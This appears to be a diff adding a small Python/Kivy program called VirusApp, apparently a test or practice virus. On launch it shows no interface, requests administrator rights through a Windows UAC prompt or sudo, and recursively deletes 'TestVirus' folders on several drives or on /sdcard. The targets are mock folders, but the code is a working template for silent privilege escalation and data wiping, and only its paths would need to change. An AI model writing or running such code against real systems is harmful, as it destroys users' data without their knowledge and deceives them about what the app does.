@@ -1,0 +1,77 @@
+import os
+import sys
+import shutil
+import platform
+import subprocess
+
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+
+
+class RootWidget(BoxLayout):
+    pass  # интерфейса нет, всё запускается автоматически
+
+
+def is_admin():
+    if platform.system() == "Windows":
+        try:
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin()
+        except:
+            return False
+    else:
+        return os.geteuid() == 0
+
+
+def escalate_privileges():
+    if platform.system() == "Windows":
+        import ctypes
+        script = sys.argv[0]
+        params = " ".join(sys.argv[1:])
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, script + " " + params, None, 1
+        )
+        sys.exit()
+    else:
+        if not is_admin():
+            subprocess.call(['sudo', sys.executable] + sys.argv)
+            sys.exit()
+
+
+def nuke_windows():
+    targets = ["C:\\TestVirus", "D:\\TestVirus", "E:\\TestVirus"]
+    for drive in targets:
+        if os.path.exists(drive):
+            try:
+                shutil.rmtree(drive, ignore_errors=True)
+                print(f"[VIRUS] Deleted {drive}")
+            except Exception as e:
+                print(f"[ERROR] Could not delete {drive}: {e}")
+
+
+def nuke_unix():
+    target = "/sdcard/TestVirus"
+    if os.path.exists(target):
+        try:
+            shutil.rmtree(target, ignore_errors=True)
+            print(f"[VIRUS] Deleted {target}")
+        except Exception as e:
+            print(f"[ERROR] Could not delete {target}: {e}")
+
+
+class VirusApp(App):
+    def build(self):
+        self.start_payload()
+        return RootWidget()  # Просто корневой контейнер, не отображается
+
+    def start_payload(self):
+        system = platform.system()
+        if system == "Windows":
+            escalate_privileges()
+            nuke_windows()
+        else:
+            nuke_unix()
+
+
+if __name__ == "__main__":
+    VirusApp().run()
